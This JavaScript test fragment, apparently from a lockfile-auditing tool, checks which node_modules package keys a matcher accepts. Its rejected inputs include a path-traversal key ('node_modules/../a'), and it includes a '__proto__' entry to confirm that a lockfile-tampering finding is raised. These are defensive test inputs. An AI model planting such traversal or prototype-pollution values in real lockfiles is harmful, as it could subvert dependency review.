  const k = packageKeyMatcher(['packages/*', 'site']);
  for (const key of [
    'node_modules/a',
    'node_modules/@s/p',
    'node_modules/a/node_modules/@s/p',
    'site/node_modules/a',
    'packages/core/node_modules/a/node_modules/b',
  ]) {
    assert.ok(k(key), key);
  }
  for (const key of [
    '',
    'site',
    'xnode_modules/a',
    'docs/node_modules/a',
    'packages/node_modules/a',
    'packages/core/x/node_modules/a',
    'node_modules/a/b',
    'node_modules/../a',
    'node_modules/a/node_modules/',
    'node_modules/@s/p/q',
  ]) {
    assert.ok(!k(key), key);
  }
  assert.ok(!packageKeyMatcher()('site/node_modules/a'));
  // __proto__: an own key is an added entry, not Object.prototype
  const protoLock = json({
    ...LOCK,
    packages: { ...LOCK.packages, ...JSON.parse('{"__proto__": {}}') },
  });
  assert.ok(protoLock.includes('"__proto__"'));
  assert.match(packageLockFinding(json(LOCK), protoLock), /a root or workspace entry was added/);
});
